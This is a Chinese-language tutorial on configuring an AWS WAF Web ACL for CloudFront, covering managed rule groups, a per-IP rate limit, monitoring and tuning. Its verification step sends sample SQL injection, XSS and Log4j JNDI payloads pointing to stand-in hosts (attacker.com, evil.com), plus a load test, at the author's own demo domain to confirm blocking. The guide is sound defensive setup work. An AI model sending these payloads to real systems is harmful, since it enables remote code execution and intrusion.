# 04 - CloudFront WAF 基础防护：Web ACL 与托管规则

> **目标**: 在 us-east-1 创建 WAF Web ACL，添加 AWS 托管规则（Common Rule Set、Known Bad Inputs、IP Reputation）和自定义速率限制规则，关联到 CloudFront Distribution。
>
> **预计时间**: 25-35 分钟
>
> **前提条件**:
> - 已完成文档 01（Distribution 已创建并部署）

---

## 重要前提：WAF 区域要求

> **CloudFront 的 WAF Web ACL 必须创建在 us-east-1 区域**。这是因为 CloudFront 是全球服务，其控制平面位于 us-east-1。在其他区域创建的 Web ACL 无法关联到 CloudFront Distribution。

---

## 步骤 1: 创建 WAF Web ACL

- [ ] 打开 **AWS WAF Console**（确保区域切换到 **US East (N. Virginia) us-east-1**）
- [ ] 左侧菜单 **Web ACLs** → **Create web ACL**

### 1.1 基本配置

| 参数 | 值 |
|------|-----|
| Resource type | **Amazon CloudFront distributions** |
| Region | **Global (CloudFront)** — 选择 CloudFront 后自动设定 |
| Name | `unice-demo-waf` |
| Description | `WAF protection for unice CloudFront demo platform` |
| CloudWatch metric name | `unice-demo-waf`（自动填入） |

- [ ] 点击 **Next**

### 1.2 添加规则和规则组

按以下顺序添加 4 条规则：

#### 规则 1: AWS Common Rule Set（OWASP Top 10 防护）

- [ ] 点击 **Add rules** → **Add managed rule groups**
- [ ] 展开 **AWS managed rule groups** → 开启 **Core rule set** (AWSManagedRulesCommonRuleSet)
- [ ] 点击 **Edit** 进入详细配置：

| 参数 | 值 |
|------|-----|
| Override rule group action to Count | **Yes**（建议初始设为 Count 模式观察） |

> **说明**: Common Rule Set 包含约 30 条规则，覆盖 SQL 注入、XSS、SSRF、文件包含等 OWASP Top 10 攻击。初始使用 Count 模式可以在 CloudWatch 中观察匹配情况，确认无误报后再切换为 Block。

- [ ] 点击 **Save rule**

#### 规则 2: AWS Known Bad Inputs（已知恶意输入检测）

- [ ] 继续在 **Add managed rule groups** 页面
- [ ] 开启 **Known bad inputs** (AWSManagedRulesKnownBadInputsRuleSet)

| 参数 | 值 |
|------|-----|
| Override rule group action to Count | **No**（直接 Block） |

> **说明**: 检测 Log4j (CVE-2021-44228) 漏洞利用、恶意 User-Agent 等已知恶意输入模式。由于这些是已确认的攻击模式，可以直接 Block。

- [ ] 点击 **Save rule**

#### 规则 3: AWS IP Reputation List（恶意 IP 信誉库）

- [ ] 继续在 **Add managed rule groups** 页面
- [ ] 开启 **Amazon IP reputation list** (AWSManagedRulesAmazonIpReputationList)

| 参数 | 值 |
|------|-----|
| Override rule group action to Count | **Yes**（设为 Count 用于监控） |

> **说明**: AWS 维护的恶意 IP 信誉库，包含已知的僵尸网络节点、匿名代理、暗网出口节点等。初始设为 Count 以避免误封合法用户。

- [ ] 点击 **Save rule**
- [ ] 点击 **Add rules**（返回主配置页）

#### 规则 4: 自定义速率限制规则

- [ ] 点击 **Add rules** → **Add my own rules and rule groups**
- [ ] 选择 **Rule builder**

| 参数 | 值 |
|------|-----|
| Name | `RateLimitPerIP` |
| Type | **Rate-based rule** |
| Rate limit | `2000` |
| Evaluation window | **5 minutes** |
| Request aggregation | **Source IP address** |
| Scope of inspection and rate limiting | **Consider all requests** |
| Action | **Block** |

> **说明**: 同一 IP 在 5 分钟内超过 2000 次请求将被封禁。这可以防止暴力破解攻击和简单的 DDoS。封禁会在速率降到阈值以下后自动解除。

- [ ] 点击 **Add rule**

### 1.3 设置规则优先级

- [ ] 调整规则优先级（从上到下执行，数字越小优先级越高）：

| 优先级 | 规则名称 | 动作 |
|--------|----------|------|
| 1 | AWSManagedRulesCommonRuleSet | Count |
| 2 | AWSManagedRulesKnownBadInputsRuleSet | Block |
| 3 | AWSManagedRulesAmazonIpReputationList | Count |
| 4 | RateLimitPerIP | Block |

- [ ] 设置 **Default web ACL action for requests that don't match any rules** 为 **Allow**
- [ ] 点击 **Next**

### 1.4 配置 CloudWatch Metrics

- [ ] 保持每条规则的 CloudWatch metric 为默认值
- [ ] 确认 **Request sampling options** 为 **Enable sampled requests**

- [ ] 点击 **Next**

### 1.5 Review 并创建

- [ ] 检查所有配置无误
- [ ] 点击 **Create web ACL**

---

## 步骤 2: 将 WAF Web ACL 关联到 CloudFront

- [ ] 打开 **CloudFront Console** → 选择 Distribution → **General** 标签 → **Edit settings**
- [ ] 在 **AWS WAF web ACL** 下拉菜单中选择 `unice-demo-waf`
- [ ] 点击 **Save changes**
- [ ] 等待 Distribution 状态变为 **Deployed**

> **备选方式**：也可以在 WAF Console 的 Web ACL 详情页 → **Associated AWS resources** 标签 → **Add AWS resources** → 选择 CloudFront Distribution。

---

## 步骤 3: 验证 WAF 防护

### 3.1 验证正常请求通过

```bash
# 正常请求 - 应该返回 200
curl -s -o /dev/null -w "%{http_code}" https://unice.keithyu.cloud/api/health
```

- [ ] 确认返回 `200`

### 3.2 验证 SQL 注入防护（Common Rule Set）

```bash
# 模拟 SQL 注入攻击
curl -s -o /dev/null -w "%{http_code}" \
  "https://unice.keithyu.cloud/api/products?id=1%27%20OR%201%3D1%20--"

# 模拟 XSS 攻击
curl -s -o /dev/null -w "%{http_code}" \
  "https://unice.keithyu.cloud/api/products?q=<script>alert(1)</script>"
```

- [ ] 如果 Common Rule Set 设为 Count 模式，请求仍返回 200，但在 WAF Dashboard 中可以看到匹配记录
- [ ] 如果切换为 Block 模式，返回 `403`

### 3.3 验证 Known Bad Inputs（Log4j 防护）

```bash
# 模拟 Log4j 漏洞利用请求
curl -s -o /dev/null -w "%{http_code}" \
  -H "User-Agent: \${jndi:ldap://attacker.com/exploit}" \
  https://unice.keithyu.cloud/

# 模拟 Log4j 变体攻击
curl -s -o /dev/null -w "%{http_code}" \
  "https://unice.keithyu.cloud/api/products?q=\${jndi:ldap://evil.com/a}"
```

- [ ] 确认返回 `403`（Known Bad Inputs 已设为 Block 模式）

### 3.4 验证速率限制

```bash
# 快速发送大量请求测试速率限制（注意：需要真正触发 2000 次/5分钟才会生效）
# 以下为简化测试，观察效果
for i in $(seq 1 50); do
  curl -s -o /dev/null -w "%{http_code}\n" https://unice.keithyu.cloud/api/health
done
```

- [ ] 正常情况下全部返回 200（50 次远未达到 2000 次阈值）

> **完整速率限制测试**：需要使用压测工具（如 `ab` 或 `hey`）在 5 分钟内发送超过 2000 次请求才能触发封禁：
> ```bash
> # 安装 hey 压测工具
> # brew install hey (macOS) 或 go install github.com/rakyll/hey@latest
> hey -n 2500 -c 50 https://unice.keithyu.cloud/api/health
> ```

---

## 步骤 4: 查看 WAF Dashboard

### 4.1 查看 Web ACL 概览

- [ ] 打开 **WAF Console** (us-east-1) → **Web ACLs** → `unice-demo-waf` → **Overview** 标签

关注以下指标：
- **Allowed requests**: 通过的请求数
- **Blocked requests**: 被拦截的请求数
- **Counted requests**: Count 模式匹配但放行的请求数
- **Bot requests**: 被识别为 Bot 的请求数（启用 Bot Control 后可见）

### 4.2 查看 Sampled Requests

- [ ] **Web ACLs** → `unice-demo-waf` → **Overview** → 向下滚动到 **Sampled requests**
- [ ] 选择时间范围（如 Last 3 hours）
- [ ] 查看匹配到规则的请求样本：

关注字段：
- **Source IP**: 请求来源 IP
- **URI**: 请求路径
- **Matching rule**: 匹配到的规则名称
- **Action**: 执行的动作（Allow/Block/Count）
- **Timestamp**: 请求时间

### 4.3 CloudWatch 监控

- [ ] 打开 **CloudWatch Console** (us-east-1) → **Metrics** → **WAF**
- [ ] 查看 `AllowedRequests`、`BlockedRequests`、`CountedRequests` 指标

> **告警建议**: 在生产环境中，建议为 BlockedRequests 创建 CloudWatch Alarm，当异常封禁量激增时及时通知运维团队。

---

## 步骤 5: 调优建议 — 从 Count 切换到 Block

完成一段时间的观察后（建议至少 24 小时），将 Count 模式的规则切换为 Block：

### 5.1 切换 Common Rule Set 为 Block

- [ ] **Web ACLs** → `unice-demo-waf` → **Rules** 标签
- [ ] 选择 `AWSManagedRulesCommonRuleSet` → **Edit**
- [ ] 取消勾选 **Override rule group action to Count**
- [ ] 如果需要排除个别规则（已确认为误报的规则）：
  - 展开 **Rules** 列表
  - 对误报的规则单独设置 **Override to Count**
- [ ] 点击 **Save rule**

### 5.2 切换 IP Reputation List 为 Block

- [ ] 选择 `AWSManagedRulesAmazonIpReputationList` → **Edit**
- [ ] 取消勾选 **Override rule group action to Count**
- [ ] 点击 **Save rule**

---

## Web ACL 规则总览

| 优先级 | 规则名称 | 类型 | 初始动作 | 最终动作 | 说明 |
|--------|----------|------|----------|----------|------|
| 1 | AWSManagedRulesCommonRuleSet | AWS 托管 | Count | Block | OWASP Top 10 防护 |
| 2 | AWSManagedRulesKnownBadInputsRuleSet | AWS 托管 | Block | Block | Log4j / 恶意输入 |
| 3 | AWSManagedRulesAmazonIpReputationList | AWS 托管 | Count | Block | 恶意 IP 信誉库 |
| 4 | RateLimitPerIP | 自定义 | Block | Block | 2000 次/5 分钟/IP |
| Default | — | — | Allow | Allow | 不匹配任何规则则放行 |

---

## 常见问题

| 问题 | 原因 | 解决方案 |
|------|------|----------|
| WAF Web ACL 在 CloudFront 下拉菜单中看不到 | Web ACL 未创建在 us-east-1 | 删除重建，确保在 us-east-1 区域创建 |
| 正常请求被误封（403） | Common Rule Set 过于严格 | 在 Sampled Requests 中找到误封的规则 ID，对该规则单独 Override to Count |
| 速率限制太容易触发 | Rate limit 阈值设得太低 | 调高 Rate limit（如 5000 或 10000），根据实际流量调整 |
| WAF 关联 CloudFront 后延迟增加 | WAF 规则评估增加了处理时间 | 正常现象，通常增加 1-3ms。如果规则过多（> 20 条），考虑精简 |
| CloudWatch 中看不到 WAF 指标 | 指标在 us-east-1 区域 | 切换 CloudWatch 到 us-east-1 查看 WAF 相关指标 |
| Block 模式下返回的错误页面不友好 | WAF 默认返回 403 纯文本 | 在 Web ACL 的 **Custom response** 中配置自定义错误响应体 |
